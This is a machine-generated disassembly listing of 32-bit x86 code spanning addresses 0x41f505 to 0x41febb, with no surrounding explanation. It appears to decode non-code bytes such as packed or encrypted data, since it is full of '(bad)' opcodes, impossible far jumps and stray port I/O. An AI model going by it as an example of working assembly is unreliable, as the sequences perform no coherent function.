  41f505:	jmp    0xa462f4e1
  41f50a:	push   ds
  41f50b:	jb     0x41f52c
  41f50d:	xor    al,0x10
  41f50f:	pop    edi
  41f510:	adc    al,bl
  41f512:	(bad)  
  41f513:	arpl   di,bx
  41f515:	scas   eax,DWORD PTR es:[edi]
  41f516:	add    DWORD PTR [ebp+0xd],ebx
  41f519:	pop    ebx
  41f51a:	push   esi
  41f51b:	and    dh,dl
  41f51d:	mov    cl,0x48
  41f51f:	push   ss
  41f520:	fld    QWORD PTR [esi-0x5322ebda]
  41f526:	dec    eax
  41f527:	in     al,0xee
  41f529:	mov    ecx,0xbbd3104d
  41f52e:	cmp    DWORD PTR [edi],ebx
  41f530:	ds xchg edi,eax
  41f532:	dec    eax
  41f533:	adc    eax,0x1b237bb2
  41f538:	lods   al,BYTE PTR ds:[esi]
  41f539:	mov    esi,0xad9b100a
  41f53e:	and    ch,dl
  41f540:	and    DWORD PTR [ebp+0x7b921508],edx
  41f546:	and    BYTE PTR [edx],bl
  41f548:	(bad)  
  41f549:	scas   eax,DWORD PTR es:[edi]
  41f54a:	or     BYTE PTR [eax],bl
  41f54c:	call   0xe7b3:0x8a23177b
  41f553:	cmp    BYTE PTR [esi-0x42],ch
  41f556:	stc    
  41f557:	and    ah,BYTE PTR [eax]
  41f559:	xchg   ebx,eax
  41f55a:	mov    ebx,0xda877a36
  41f55f:	sbb    ebx,DWORD PTR [ebp-0x49]
  41f562:	ret    
  41f563:	daa    
  41f564:	imul   ebp,DWORD PTR [ebx+0x19c4],0x0
	...
  41f58f:	add    BYTE PTR [eax],al
  41f591:	add    BYTE PTR [edx-0x44],dh
  41f594:	(bad)  
  41f595:	push   ss
  41f596:	push   ebp
  41f597:	mov    edx,0xb03e1fcd
  41f59c:	rcl    BYTE PTR [ebx*1+0x2f13b3c1],0xad
  41f5a4:	popf   
  41f5a5:	adc    al,0x58
  41f5a7:	mov    ebp,0x873e1990
  41f5ac:	test   al,0x24
  41f5ae:	sbb    eax,0x3e2fa09d
  41f5b3:	mov    WORD PTR [esi-0x774feddf],ss
  41f5b9:	adc    eax,0xa800871d
  41f5be:	and    bh,BYTE PTR [edx+eax*2+0x4b5b21a0]
  41f5c5:	cmp    ebp,DWORD PTR [edi]
  41f5c7:	pop    ebx
  41f5c8:	push   ecx
  41f5c9:	and    BYTE PTR cs:[edi-0x63f3d7ab],cl
  41f5d0:	pop    esp
  41f5d1:	sub    dh,BYTE PTR [esi]
  41f5d3:	mov    BYTE PTR [ecx+0x3a],dh
  41f5d6:	pop    ds
  41f5d7:	stos   BYTE PTR es:[edi],al
  41f5d8:	pop    esp
  41f5d9:	adc    eax,0x2563ab33
  41f5de:	pop    ebx
  41f5df:	mov    ebp,0x9d7d325c
  41f5e4:	das    
  41f5e5:	das    
  41f5e6:	or     al,0x9b
  41f5e8:	xor    BYTE PTR [edi],ah
  41f5ea:	pop    es
  41f5eb:	jo     0x41f61d
  41f5ed:	ror    BYTE PTR [ecx],1
  41f5ef:	jne    0x41f625
  41f5f1:	sub    BYTE PTR [ebx-0x66],bh
  41f5f4:	sub    ebp,DWORD PTR [ebx]
	...
  41f61e:	add    BYTE PTR [eax],al
  41f620:	jge    0x41f5c3
  41f622:	xor    ecx,esp
  41f624:	icebp  
  41f625:	js     0x41f666
  41f627:	mov    edi,0xb6329d09
  41f62c:	xor    ebp,DWORD PTR [esi+0x35]
  41f62f:	push   ds
  41f630:	aaa    
  41f631:	pop    ebx
  41f632:	push   ecx
  41f633:	scas   al,BYTE PTR es:[edi]
  41f634:	and    ecx,DWORD PTR [edi-0x63f057ab]
  41f63a:	pop    esp
  41f63b:	stos   BYTE PTR es:[edi],al
  41f63c:	sub    DWORD PTR [eax-0x55e1458f],ecx
  41f642:	pop    esp
  41f643:	xchg   ebp,eax
  41f644:	xor    ch,BYTE PTR [ebx-0x42a55a9d]
  41f64a:	pop    esp
  41f64b:	mov    dl,0x82
  41f64d:	pushf  
  41f64e:	aas    
  41f64f:	fmul   QWORD PTR [esi-0x791fcd94]
  41f655:	pushf  
  41f656:	das    
  41f657:	fld    TBYTE PTR [edi+0x74]
  41f65a:	xor    al,0xd6
  41f65c:	outs   dx,BYTE PTR ds:[esi]
  41f65d:	outs   dx,BYTE PTR ds:[esi]
  41f65e:	sub    eax,DWORD PTR [eax]
  41f660:	aad    0x9c
  41f662:	xor    edi,DWORD PTR [ecx]
  41f664:	jb     0x41f600
  41f666:	xor    al,0x38
  41f668:	mov    ch,0xa
  41f66a:	inc    ebx
  41f66b:	cmp    BYTE PTR [edi+0x14323018],dh
  41f671:	push   edx
  41f672:	add    BYTE PTR [edi+0xe],dh
  41f675:	dec    esp
  41f676:	popa   
  41f677:	data16 sti 
  41f679:	dec    esi
  41f67a:	outs   dx,DWORD PTR ds:[esi]
  41f67b:	jb     0x41f666
  41f67d:	dec    ebx
  41f67e:	cs imul esi,ecx,0x770045
	...
  41f6ad:	add    dh,ch
  41f6af:	dec    ebx
  41f6b0:	popa   
  41f6b1:	data16 jnp 0x41f703
  41f6b4:	imul   esi,DWORD PTR cs:[ecx+0x48],0x6f6b4600
  41f6bc:	push   esi
  41f6bd:	outs   dx,DWORD PTR ds:[esi]
  41f6be:	pop    esi
  41f6bf:	and    BYTE PTR [ebx+0x65],0x35
  41f6c3:	or     eax,0x5f377463
  41f6c8:	inc    esi
  41f6c9:	push   esp
  41f6ca:	daa    
  41f6cb:	jne    0x41f738
  41f6cd:	jns    0x41f705
  41f6cf:	inc    esi
  41f6d0:	popa   
  41f6d1:	jb     0x41f6d4
  41f6d3:	push   eax
  41f6d4:	pop    edi
  41f6d5:	add    BYTE PTR [ebx+0x69],al
  41f6d8:	push   0x4f4e1169
  41f6dd:	outs   dx,DWORD PTR ds:[esi]
  41f6de:	stc    
  41f6df:	push   esi
  41f6e0:	arpl   WORD PTR cs:[eax],ax
  41f6e3:	inc    esp
  41f6e4:	add    BYTE PTR [esi-0xc],ch
  41f6e7:	dec    ecx
  41f6e8:	das    
  41f6e9:	cs sti 
  41f6eb:	dec    esi
  41f6ec:	ins    BYTE PTR es:[edi],dx
  41f6ed:	add    BYTE PTR [ecx-0x21a0b097],dl
  41f6f3:	push   eax
  41f6f4:	gs je  0x41f69e
  41f6f7:	jo     0x41f748
  41f6f9:	push   ebx
  41f6fa:	sub    BYTE PTR [ecx+0x68],0x75
  41f6fe:	retf   
  41f6ff:	inc    esi
  41f700:	imul   esi,DWORD PTR [edi+0x3e],0xffffffde
  41f704:	add    BYTE PTR [esi-0x13],cl
  41f707:	loopne 0x41f747
  41f709:	pop    edi
  41f70a:	or     eax,0xe133cad7
  41f70f:	call   FWORD PTR [edi]
  41f711:	popa   
	...
  41f73a:	add    BYTE PTR [eax],al
  41f73c:	jmp    0xeb841718
  41f741:	fstp   QWORD PTR [edx]
  41f743:	arpl   sp,bp
  41f745:	xor    esi,DWORD PTR [eax]
  41f747:	inc    ebx
  41f748:	std    
  41f749:	push   0x30
  41f74b:	inc    ebx
  41f74c:	or     ebp,DWORD PTR [ebp+0x3e]
  41f74f:	jb     0x41f72c
  41f751:	sahf   
  41f752:	cmp    DWORD PTR [ebx+eiz*8-0x72],esi
  41f756:	add    al,0x50
  41f758:	cmc    
  41f759:	and    dl,dl
  41f75b:	pop    esp
  41f75c:	adc    DWORD PTR [edi+0x70a04710],0x5398721d
  41f766:	sbb    BYTE PTR [ecx-0x65],cl
  41f769:	jnp    0x41f79a
  41f76b:	ins    BYTE PTR es:[edi],dx
  41f76c:	test   eax,0x85500448
  41f771:	add    edx,edx
  41f773:	pop    esp
  41f774:	jg     0x41f79d
  41f776:	or     eax,0x10569b68
  41f77b:	addr16 pop ebp
  41f77d:	push   ebx
  41f77e:	adc    BYTE PTR [ebx+0x3e],ah
  41f781:	inc    esp
  41f782:	aaa    
  41f783:	das    
  41f784:	das    
  41f785:	loope  0x41f7c3
  41f787:	push   edx
  41f788:	add    DWORD PTR [eax],0xb4c611e
  41f78e:	adc    DWORD PTR [esi+edi*1-0x1c],esi
  41f792:	aaa    
  41f793:	das    
  41f794:	paddw  mm7,QWORD PTR [edx]
  41f797:	jb     0x41f7f4
  41f799:	pop    ds
  41f79a:	xor    BYTE PTR [ecx+ebp*1-0x18],ch
	...
  41f7ca:	ds xor al,0x1
  41f7cd:	add    BYTE PTR [esi],bh
  41f7cf:	pop    ebx
  41f7d0:	out    0x3,eax
  41f7d2:	ds pop ebx
  41f7d4:	out    0x3,eax
  41f7d6:	ds pop ebx
  41f7d8:	out    0x3,eax
  41f7da:	ds pop ebx
  41f7dc:	out    0x3,eax
  41f7de:	ds pop ebx
  41f7e0:	out    0x3,eax
  41f7e2:	ds pop ebx
  41f7e4:	out    0x3,eax
  41f7e6:	ds pop ebx
  41f7e8:	out    0x3,eax
  41f7ea:	ds stos BYTE PTR es:[edi],al
  41f7ec:	js     0x41f805
  41f7ee:	loope  0x41f79e
  41f7f0:	dec    esp
  41f7f1:	rcl    DWORD PTR [ebx],1
  41f7f3:	mov    edi,0xaa3e184b
  41f7f8:	pop    eax
  41f7f9:	sbb    cl,bl
  41f7fb:	scas   al,BYTE PTR es:[edi]
  41f7fc:	inc    esp
  41f7fd:	shr    edx,1
  41f7ff:	mov    ch,0x37
  41f801:	pop    ds
  41f802:	rcr    BYTE PTR [edx+0x3a],1
  41f805:	adc    ebp,DWORD PTR [edx+0x6f1f3bb2]
  41f80b:	test   BYTE PTR [edx+0x18],cl
  41f80e:	fwait
  41f80f:	test   al,0xc
  41f811:	add    al,0xaf
  41f813:	stos   BYTE PTR es:[edi],al
  41f814:	or     ebx,DWORD PTR [ebx]
  41f816:	xchg   edx,eax
  41f817:	mov    esi,0xa98e24da
  41f81c:	add    al,0x14
  41f81e:	imul   ebp,DWORD PTR [ecx-0x5570fbf4],0xbe721b0b
  41f828:	mov    edx,0x4af6f24
  41f82d:	adc    al,0x0
	...
  41f857:	add    BYTE PTR [esi],bh
  41f859:	test   al,0xd8
  41f85b:	pop    ss
  41f85c:	pop    ecx
  41f85d:	scas   eax,DWORD PTR es:[edi]
  41f85e:	(bad)  
  41f85f:	sar    BYTE PTR [edx-0x48],1
  41f862:	(bad)  
  41f863:	pop    ss
  41f864:	dec    ebp
  41f865:	mov    dh,0xbd
  41f867:	and    al,0x5c
  41f869:	mov    ds:0x5b4f1ebb,al
  41f86e:	mov    edx,0xb22a12
  41f873:	mov    ebp,0xca5d6a50
  41f878:	push   edx
  41f879:	mov    bh,0x73
  41f87b:	xchg   esp,eax
  41f87c:	dec    ebx
  41f87d:	xchg   BYTE PTR [edx-0x73],ah
  41f880:	xor    bh,BYTE PTR [ecx-0x49d71700]
  41f886:	jp     0x41f822
  41f888:	sub    al,0xb7
  41f88a:	addr16 jge 0x41f8ad
  41f88d:	push   0x2e
  41f88f:	test   DWORD PTR [ecx-0x49],edx
  41f892:	add    BYTE PTR [edx+0x4c],bh
  41f895:	mov    bh,0x67
  41f897:	jne    0x41f8e1
  41f899:	push   0x5d
  41f89b:	push   esi
  41f89c:	push   0xffffffb9
  41f89e:	outs   dx,BYTE PTR ds:[esi]
  41f89f:	jmp    0x40aeadf4
  41f8a4:	push   esi
  41f8a5:	mov    ecx,0xb0612e31
  41f8aa:	ins    DWORD PTR es:[edi],dx
  41f8ab:	cmp    dl,BYTE PTR [edi+0x24]
  41f8ae:	jb     0x41f8e8
  41f8b0:	cs mov ebp,0x86694c74
  41f8b6:	jo     0x41f8f3
  41f8b8:	pop    ss
  41f8b9:	mov    ah,0x5f
  41f8bb:	sbb    eax,DWORD PTR [eax]
	...
  41f8e5:	add    BYTE PTR [edi],dl
  41f8e7:	and    al,0x72
  41f8e9:	sbb    BYTE PTR [esi],cl
  41f8eb:	mov    ebp,0x86490c74
  41f8f0:	jno    0x41f907
  41f8f2:	pop    ss
  41f8f3:	mov    ah,0x0
  41f8f5:	cli    
  41f8f6:	or     dh,BYTE PTR [eax+0x6ae6f567]
  41f8fc:	pop    ebp
  41f8fd:	or     ch,ch
  41f8ff:	scas   eax,DWORD PTR es:[edi]
  41f900:	jae    0x41f8fe
  41f902:	out    dx,eax
  41f903:	xchg   BYTE PTR [edx-0x20],ah
  41f906:	jmp    0xd12b6ac3
  41f90b:	mov    ah,0x6c
  41f90d:	ror    cl,0xb8
  41f910:	xor    DWORD PTR [esi+0x6cb6e0],ebp
  41f916:	sub    BYTE PTR [edx],0x6b
  41f919:	pop    edi
  41f91a:	test   DWORD PTR [ebx],esi
  41f91c:	ins    BYTE PTR es:[edi],dx
  41f91d:	bound  esp,QWORD PTR [edi-0x68ffffa9]
  41f923:	push   edi
  41f924:	add    BYTE PTR [eax],al
  41f926:	xchg   edi,eax
  41f927:	push   edi
  41f928:	add    BYTE PTR [eax],al
  41f92a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92b:	push   edi
  41f92c:	add    BYTE PTR [eax],al
  41f92e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92f:	push   edi
  41f930:	add    BYTE PTR [eax],al
  41f932:	xchg   edi,eax
  41f933:	push   edi
  41f934:	add    BYTE PTR [eax],al
  41f936:	xchg   edi,eax
  41f937:	push   edi
  41f938:	add    BYTE PTR [eax],al
  41f93a:	addr16 push edi
  41f93c:	add    BYTE PTR [eax],al
  41f93e:	addr16 push edi
  41f940:	jo     0x41f9b4
  41f942:	call   0xf2ae5f78
  41f947:	sub    ebp,DWORD PTR [ebx]
  41f949:	imul   eax,DWORD PTR [eax],0x0
	...
  41f973:	add    BYTE PTR [ecx],cl
  41f975:	ss std 
  41f977:	dec    edi
  41f978:	cmc    
  41f979:	daa    
  41f97a:	arpl   WORD PTR [ecx+0xb],bp
  41f97d:	xor    bh,ch
  41f97f:	dec    eax
  41f980:	add    al,0xd
  41f982:	bound  ebp,QWORD PTR [esi+eax*4+0x23]
  41f986:	data16 jbe 0x41f90b
  41f989:	push   edi
  41f98a:	push   eax
  41f98b:	popa   
  41f98c:	jae    0x41f9bd
  41f98e:	std    
  41f98f:	dec    edi
  41f990:	and    esp,DWORD PTR ss:[ebp+0x54]
  41f994:	dec    eax
  41f995:	adc    al,0x75
  41f997:	gs daa 
  41f999:	das    
  41f99a:	outs   dx,DWORD PTR ds:[esi]
  41f99b:	gs inc ecx
  41f99d:	sub    ch,BYTE PTR [ebx]
  41f99f:	push   0x4
  41f9a1:	pop    edi
  41f9a2:	outs   dx,DWORD PTR ds:[esi]
  41f9a3:	imul   eax,DWORD PTR [eax+0x2d],0x6cf46e6c
  41f9aa:	outs   dx,DWORD PTR ds:[esi]
  41f9ab:	jno    0x41f998
  41f9ad:	das    
  41f9ae:	jno    0x41fa15
  41f9b0:	xlat   BYTE PTR ds:[ebx]
  41f9b1:	sub    DWORD PTR [esi+0x67],esp
  41f9b4:	or     DWORD PTR [esi],ebp
  41f9b6:	imul   esi,DWORD PTR [ebx+0x3e],0x5a
  41f9ba:	clc    
  41f9bb:	ja     0x41fa0f
  41f9bd:	xor    al,0xf6
  41f9bf:	pop    cx
  41f9c1:	or     dh,dl
  41f9c3:	ins    DWORD PTR es:[edi],dx
  41f9c4:	sub    eax,0x36742f26
  41f9c9:	loopne 0x41f9cb
  41f9cb:	jno    0x41f9e4
  41f9cd:	sbb    edi,ebp
  41f9cf:	ins    BYTE PTR es:[edi],dx
  41f9d0:	adc    ch,al
  41f9d2:	xor    eax,0xf4fc122e
  41f9d7:	inc    DWORD PTR [eax]
	...
  41fa01:	add    BYTE PTR [esi+eax*1-0x1a],bl
  41fa05:	call   FWORD PTR [esi+eax*1-0x1b]
  41fa09:	call   FWORD PTR [esi+eiz*8-0x19]
  41fa0d:	dec    DWORD PTR [edi+esi*8]
  41fa10:	int3   
  41fa11:	inc    edx
  41fa12:	std    
  41fa13:	mov    edi,0xa4d96820
  41fa18:	cmc    
  41fa19:	ins    DWORD PTR es:[edi],dx
  41fa1a:	fild   WORD PTR [esi-0x68e1d41b]
  41fa20:	repnz pusha 
  41fa22:	int3   
  41fa23:	mov    dh,ah
  41fa25:	jae    0x41fa0a
  41fa27:	xchg   edi,eax
  41fa28:	aad    0x70
  41fa2a:	(bad)  [ebp-0xe]
  41fa2d:	pop    esi
  41fa2e:	stos   DWORD PTR es:[edi],eax
  41fa2f:	xchg   edi,eax
  41fa30:	xor    BYTE PTR [eax],ah
  41fa32:	fwait
  41fa33:	call   0x62f8:0x64a771e3
  41fa3a:	call   0xef49:0x8d70e164
  41fa41:	jno    0x41f9dd
  41fa43:	adc    al,0xc7
  41fa45:	push   ecx
  41fa46:	jns    0x41fa87
  41fa48:	and    al,0x6b
  41fa4a:	xchg   ecx,eax
  41fa4b:	pop    esi
  41fa4c:	fild   QWORD PTR [ebx+0x69]
  41fa4f:	pop    ecx
  41fa50:	jmp    0xc77667c2
  41fa55:	data16 ins BYTE PTR es:[edi],dx
  41fa57:	push   edi
  41fa58:	jmp    0x84df:0xe75b666c
  41fa5f:	mov    dl,0xe1
  41fa61:	jmp    0x0:0xdfc8af65
	...
  41fa90:	xor    DWORD PTR [ecx+ebx*8-0x404da41a],0xffffffdf
  41fa98:	mov    ecx,0x2de9ce8c
  41fa9d:	stos   BYTE PTR es:[edi],al
  41fa9e:	enter  0x1cf5,0x7f
  41faa2:	pushf  
  41faa3:	lock daa 
  41faa5:	mov    ah,0x93
  41faa7:	out    dx,eax
  41faa8:	clc    
  41faa9:	pop    edx
  41faaa:	int3   
  41faab:	cs gs pop ebx
  41faae:	(bad)  
  41faaf:	neg    DWORD PTR [ecx]
  41fab1:	gs mov esi,0x7bb33e30
  41fab7:	imul   ecx
  41fab9:	fs into 
  41fabb:	xor    BYTE PTR [esi],bh
  41fabd:	mov    bl,0x7b
  41fabf:	neg    ecx
  41fac1:	lods   eax,DWORD PTR ds:[esi]
  41fac2:	mov    cl,0x30
  41fac4:	adc    ebx,DWORD PTR [ebx+0x4d]
  41fac7:	clc    
  41fac8:	jmp    0xd92be23d
  41facd:	lods   al,BYTE PTR ds:[esi]
  41face:	dec    esp
  41facf:	retf   0x8aed
  41fad2:	pop    edx
  41fad3:	jmp    0x41faa2
  41fad5:	mov    bh,0x3a
  41fad7:	xor    ah,BYTE PTR [edx-0x70fbcc46]
  41fadd:	mov    dh,0x48
  41fadf:	iret   
  41fae0:	call   0x435b:0xa8e742b1
  41fae7:	iret   
  41fae8:	stos   BYTE PTR es:[edi],al
  41fae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faea:	adc    al,dh
  41faec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faed:	mov    edx,0xba9cd533
  41faf2:	sbb    al,0xf1
	...
  41fb1c:	add    BYTE PTR [eax],al
  41fb1e:	xchg   ebx,eax
  41fb1f:	mov    ah,0xc
  41fb21:	sti    
  41fb22:	xchg   ebp,eax
  41fb23:	pop    ebx
  41fb24:	and    eax,0xbc62f0
  41fb29:	add    al,BYTE PTR [edx+0x7f]
  41fb2c:	inc    esi
  41fb2d:	std    
  41fb2e:	out    dx,al
  41fb2f:	mov    ebx,0xab03c569
  41fb34:	ins    DWORD PTR es:[edi],dx
  41fb35:	(bad)  
  41fb36:	retf   0x72bd
  41fb39:	mov    ch,0x3d
  41fb3b:	xchg   esp,eax
  41fb3c:	ins    DWORD PTR es:[edi],dx
  41fb3d:	rcl    esp,cl
  41fb3f:	mov    ah,0x6c
  41fb41:	enter  0x7f3d,0x4b
  41fb45:	into   
  41fb46:	mov    bl,0xb9
  41fb48:	ins    BYTE PTR es:[edi],dx
  41fb49:	lds    ebx,FWORD PTR [esp+eax*4-0x495144b0]
  41fb50:	addr16 xchg ebp,eax
  41fb52:	mov    al,ds:0x6ae95cab
  41fb57:	scas   eax,DWORD PTR es:[edi]
  41fb58:	popfw  
  41fb5a:	xchg   BYTE PTR [ecx-0x6b9e7b8e],al
  41fb60:	arpl   WORD PTR [edx+eiz*2-0x726ab948],cx
  41fb67:	and    BYTE PTR [eax+0x79],al
  41fb6a:	ins    DWORD PTR es:[edi],dx
  41fb6b:	pushf  
  41fb6c:	addr16 jnp 0x41fbac
  41fb6f:	(bad)  
  41fb70:	ins    DWORD PTR es:[edi],dx
  41fb71:	dec    edx
  41fb72:	arpl   WORD PTR [esp+eax*2+0x5f204c50],si
  41fb79:	inc    esi
  41fb7a:	pop    ecx
  41fb7b:	mov    bl,0x6b
  41fb7d:	dec    eax
  41fb7e:	dec    esp
  41fb7f:	mov    bl,0x2e
  41fb81:	dec    ebp
	...
  41fbaa:	add    BYTE PTR [eax],al
  41fbac:	and    ebp,DWORD PTR [eax+eax*1+0x63ac231a]
  41fbb3:	and    BYTE PTR [eax],bl
  41fbb5:	mov    dh,0x6d
  41fbb7:	dec    DWORD PTR [edx]
  41fbb9:	xchg   esi,eax
  41fbba:	push   eax
  41fbbb:	jmp    0xfa9b7c8
  41fbc0:	cmp    bl,BYTE PTR [ecx-0x55e6e0a1]
  41fbc6:	addr16 adc eax,0x2eab17
  41fbcc:	dec    ebx
  41fbcd:	ss jno 0x41fbd0
  41fbd0:	dec    eax
  41fbd1:	imul   eax,DWORD PTR cs:[esi+0x4b],0x7
  41fbd6:	std    
  41fbd7:	jb     0x41fc17
  41fbd9:	and    esp,DWORD PTR [edx+0x73]
  41fbdc:	xor    DWORD PTR [ebx],esi
  41fbde:	pop    edi
  41fbdf:	add    BYTE PTR [edi+ecx*1-0x64b6b0],ah
  41fbe6:	ja     0x41fc19
  41fbe8:	es sbb al,0x2e
  41fbeb:	inc    esp
  41fbec:	mov    eax,0xe62d2d67
  41fbf1:	pop    esi
  41fbf2:	xor    DWORD PTR [edx+0x42],eax
  41fbf5:	sub    ax,0xa564
  41fbf9:	push   0x38
  41fbfb:	inc    ecx
  41fbfc:	lahf   
  41fbfd:	imul   ebp,DWORD PTR [ecx],0x30
  41fc00:	ja     0x41fc65
  41fc02:	xor    BYTE PTR [ecx-0x25],al
  41fc05:	sbb    DWORD PTR [eax],esi
  41fc07:	xor    bl,cl
  41fc09:	adc    eax,0xea37d31
  41fc0e:	imul   edx,DWORD PTR [eax+0x0],0x0
	...
  41fc3a:	cmc    
  41fc3b:	xor    BYTE PTR [eax+0x53],ah
  41fc3e:	mov    edx,0xe5657329
  41fc43:	ins    BYTE PTR es:[edi],dx
  41fc44:	xor    al,BYTE PTR [eax]
  41fc46:	hlt    
  41fc47:	xor    DWORD PTR [edi+0x76],ebp
  41fc4a:	cli    
  41fc4b:	sub    al,0x70
  41fc4d:	cs out dx,eax
  41fc4f:	sub    DWORD PTR [ecx+0x0],ebp
  41fc52:	adc    ebx,DWORD PTR [ecx]
  41fc54:	push   ecx
  41fc55:	push   eax
  41fc56:	push   0x7a747134
  41fc5b:	sub    ebp,edi
  41fc5d:	inc    esp
  41fc5e:	inc    esp
  41fc5f:	add    esp,DWORD PTR [ecx+0x62]
  41fc62:	and    eax,0x3b616471
  41fc67:	push   edi
  41fc68:	dec    ebp
  41fc69:	inc    esp
  41fc6a:	inc    esi
  41fc6b:	and    ebx,DWORD PTR [esi+0x2e]
  41fc6e:	ds push eax
  41fc70:	jecxz  0x41fce5
  41fc72:	ds jo  0x41fc3c
  41fc75:	jo     0x41fce9
  41fc77:	and    esi,ebp
  41fc79:	gs push 0x40
  41fc7c:	ret    
  41fc7d:	dec    ebx
  41fc7e:	add    BYTE PTR [eax-0x2c],0xff
  41fc82:	jbe    0x41fca2
  41fc84:	cmc    
  41fc85:	bound  ecx,QWORD PTR [esi+eax*1-0x18]
  41fc89:	jae    0x41fca9
  41fc8b:	idiv   eax
  41fc8d:	outs   dx,DWORD PTR ds:[esi]
  41fc8e:	pop    edx
  41fc8f:	adc    eax,0x344c62ef
  41fc94:	(bad)  
  41fc95:	data16 sub BYTE PTR [ebx],cl
  41fc98:	jmp    0x41fcfc
  41fc9a:	sub    dh,cl
  41fc9c:	jecxz  0x41fcfe
	...
  41fcc6:	add    BYTE PTR [eax],al
  41fcc8:	push   ss
  41fcc9:	cmpps  xmm6,XMMWORD PTR [ecx+0x1b],0x18
  41fcce:	call   0xe40d0f40
  41fcd3:	imul   ecx,DWORD PTR ds:0x5e50d034,0xfffffffb
  41fcda:	(bad)  
  41fcdb:	pop    ds
  41fcdc:	clc    
  41fcdd:	out    0xd0,eax
  41fcdf:	pop    ds
  41fce0:	push   cs
  41fce1:	shl    ecx,cl
  41fce3:	jo     0x41fcce
  41fce5:	int3   
  41fce6:	out    dx,al
  41fce7:	arpl   bp,bp
  41fce9:	xor    eax,ebp
  41fceb:	dec    edi
  41fcec:	inc    ebx
  41fcee:	retf   
  41fcef:	cmp    DWORD PTR [esi],ebx
  41fcf1:	xor    al,0xc1
  41fcf3:	dec    ecx
  41fcf4:	or     DWORD PTR [eax+0x68],eax
  41fcf7:	mov    edx,0x7bbc2379
  41fcfc:	fiadd  DWORD PTR ds:[ebx]
  41fcff:	add    BYTE PTR ds:0x49c1,0x69
  41fd05:	and    BYTE PTR [ebp-0x46],ah
  41fd08:	stc    
  41fd09:	add    bh,BYTE PTR [ebx+edi*2+0x6703da3e]
  41fd10:	sbb    BYTE PTR [ebx-0x6b],0xc2
  41fd14:	xchg   DWORD PTR [esi-0x25],esp
  41fd17:	les    ecx,FWORD PTR [di]
  41fd1a:	clc    
  41fd1b:	mov    esp,0x4415b85
  41fd20:	popa   
  41fd21:	xchg   ebp,eax
  41fd22:	xchg   ebp,eax
  41fd23:	cmp    eax,0x26e75b3e
  41fd28:	imul   ecx,DWORD PTR cs:[edi],0x4
	...
  41fd53:	add    BYTE PTR [eax],al
  41fd55:	add    BYTE PTR [edi+0x52f805ae],cl
  41fd5b:	mov    esp,0x9075e6d9
  41fd60:	shl    al,1
  41fd62:	dec    edi
  41fd63:	scas   al,BYTE PTR es:[edi]
  41fd64:	(bad)  
  41fd66:	pop    ebx
  41fd67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd68:	stos   DWORD PTR es:[edi],eax
  41fd69:	retf   0xa72b
  41fd6c:	int3   
  41fd6d:	icebp  
  41fd6e:	and    edi,DWORD PTR [eax-0x5d02dc4d]
  41fd74:	mov    bh,0xef
  41fd76:	adc    ch,BYTE PTR [ecx-0x6c0a0e3c]
  41fd7c:	xchg   ebp,eax
  41fd7d:	neg    DWORD PTR [edi+ebp*4]
  41fd80:	mov    ebp,edx
  41fd82:	add    ebp,DWORD PTR [esi+0x7f0eee99]
  41fd88:	mov    edx,0x88a8eaf7
  41fd8d:	in     al,0xdc
  41fd8f:	push   0x5b3e03e7
  41fd94:	out    0xe2,eax
  41fd96:	popa   
  41fd97:	mov    ebx,0x6b59e6e7
  41fd9c:	out    0x3b,eax
  41fd9e:	ds gs out 0x3a,eax
  41fda2:	ds mov ch,0xe7
  41fda5:	cs ds fs out 0xe1,eax
  41fdaa:	cmp    DWORD PTR [ecx-0x19],ebp
  41fdad:	xor    al,0x3e
  41fdaf:	outs   dx,BYTE PTR ds:[esi]
  41fdb0:	out    0x37,eax
  41fdb2:	ds mov eax,0x1d19e900
  41fdb8:	cmp    cl,ch
	...
  41fde2:	add    BYTE PTR [eax],al
  41fde4:	push   0x4ee95f5b
  41fde9:	pop    ebx
  41fdea:	xor    ebp,ecx
  41fdec:	inc    ebp
  41fded:	pop    ebx
  41fdee:	sub    ebp,ecx
  41fdf0:	push   ds
  41fdf1:	sbb    eax,0x5b2fe92f
  41fdf6:	aaa    
  41fdf7:	jmp    0xe9765929
  41fdfc:	loope  0x41fe1a
  41fdfe:	pop    edi
  41fdff:	jmp    0xe9781ae0
  41fe04:	jecxz  0x41fe22
  41fe06:	ss jmp 0xd08d5949
  41fe0c:	fisubr WORD PTR [edx-0x492d2593]
  41fe12:	je     0x41fdc2
  41fe14:	xchg   edx,eax
  41fe15:	mov    ch,0x6e
  41fe17:	mov    al,0xa3
  41fe19:	mov    ecx,0x5b579e74
  41fe1e:	mov    bp,0x62ad
  41fe22:	sub    eax,0x6d8a3dfe
  41fe27:	(bad)
  41fe2b:	fwait
  41fe2c:	mov    al,ds:0x928d3f80
  41fe31:	mov    edx,0xaf7ead63
  41fe36:	imul   edx,DWORD PTR [edx+eiz*2+0x549a00ae],0xffffffa8
  41fe3e:	arpl   WORD PTR [edx-0x7b8955a8],bx
  41fe44:	dec    edi
  41fe45:	stos   DWORD PTR es:[edi],eax
  41fe46:	add    BYTE PTR [edx],bh
	...
  41fe70:	add    BYTE PTR [eax],al
  41fe72:	arpl   WORD PTR [eax-0x55a0c59d],bp
  41fe78:	jbe    0x41fec6
  41fe7a:	dec    eax
  41fe7b:	cmp    al,0x23
  41fe7d:	inc    ebp
  41fe7e:	push   ss
  41fe7f:	xchg   esp,eax
  41fe80:	ins    DWORD PTR es:[edi],dx
  41fe81:	add    BYTE PTR [ebx+ebp*1-0x3],dh
  41fe85:	push   edx
  41fe86:	mov    gs,WORD PTR [ebx]
  41fe88:	bound  edx,QWORD PTR [ebx+0x72]
  41fe8b:	and    eax,0x77556573
  41fe90:	and    DWORD PTR [ebx+edi*2+0x8],esp
  41fe94:	bound  esp,QWORD PTR [edx+0x52]
  41fe97:	and    eax,0x2e440069
  41fe9c:	jno    0x41ff03
  41fe9e:	xor    al,0x3a
  41fea0:	outs   dx,DWORD PTR ds:[esi]
  41fea1:	jbe    0x41fee5
  41fea3:	and    eax,0x343251d
  41fea8:	dec    edi
  41fea9:	cmp    dh,BYTE PTR gs:[eax]
  41feac:	jno    0x41ff13
  41feae:	pop    es
  41feaf:	fsub   QWORD PTR [ebp+0x72]
  41feb2:	add    dh,BYTE PTR ds:0x1ee56f71
  41feb8:	std    
  41feb9:	push   edx
  41feba:	(bad)  
  41febb:	sub    esp,DWORD PTR [edx+0x53]
